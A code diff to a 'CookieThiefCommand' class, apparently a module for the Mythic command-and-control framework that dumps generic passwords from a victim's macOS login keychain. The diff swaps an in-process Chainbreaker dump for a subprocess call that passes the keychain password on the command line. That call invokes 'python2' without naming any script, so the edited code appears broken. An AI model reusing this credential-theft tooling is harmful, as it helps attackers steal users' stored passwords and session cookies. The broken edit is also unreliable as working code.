@@ -83,37 +83,13 @@ class CookieThiefCommand(CommandBase):
 
 
         try:
-            keychain = Chainbreaker("/Mythic/mythic/tmp_login.keychain-db", unlock_password=password, unlock_key=None,
-                                    unlock_file=None)
-
-            keychainoutput = []
-
-            keychainoutput.append(
-                {
-                    'header': 'Generic Passwords',
-                    'records': keychain.dump_generic_passwords(),
-                    # 'write_to_console': args.dump_generic_passwords,
-                    # 'write_to_disk': args.export_generic_passwords,
-                    # 'write_directory': os.path.join(args.output, 'passwords', 'generic')
-                }
-            )
-
+            subprocess.run(["python2", "--password=" + password, "--dump-generic-passwords", "tmp_login.keychain-db"])
 
         except Exception as e:
             #print("Chainbreaker script failed with error: " + str(e))
             traceback.print_exc()
             sys.stdout.flush()
             sys.exit(1)
-
-        try:
-            for record_collection in keychainoutput:
-                for record in record_collection['records']:
-                    for line in str(record).split('\n'):
-                        print("%s" % line)
-                        sys.stdout.flush()
-        except Exception as e:
-            print("Print failed with error: " + str(e))
-            sys.stdout.flush()
 
 
         try:
